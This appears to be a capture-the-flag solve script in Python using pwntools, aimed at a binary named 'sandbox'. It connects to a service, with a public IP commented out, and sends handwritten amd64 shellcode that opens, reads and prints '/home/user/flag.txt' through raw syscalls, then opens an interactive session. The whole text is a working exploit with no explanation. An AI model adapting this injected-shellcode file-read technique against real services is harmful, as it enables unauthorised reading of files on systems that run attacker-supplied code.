from pwn import *

exe = ELF("./sandbox", checksec=False)

p = remote('127.0.0.1', 1337)
# p = remote('61.28.236.247', 33192)

context.arch = 'amd64'

shellcode = asm(
    """
    mov rbx, 0x00000000747874
    push rbx
    mov rbx, 0x2e67616c662f7265
    push rbx
    mov rbx, 0x73752f656d6f682f
    push rbx
     
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    mov rax, 2                    # syscall: open
    syscall

    mov rdi, rax                  # rdi = fd
    mov rsi, rsp                  # rsi = buffer
    mov rdx, 0x100                # rdx = length
    xor rax, rax                  # syscall: read (rax = 0)
    syscall

    mov rdi, 1                    # rdi = stdout
    mov rax, 1                    # syscall: write
    syscall
    """, arch='amd64'
)

p.sendlineafter(': ', shellcode)
output = p.recvall(timeout=3)
print(output.decode(errors="ignore"))

p.interactive()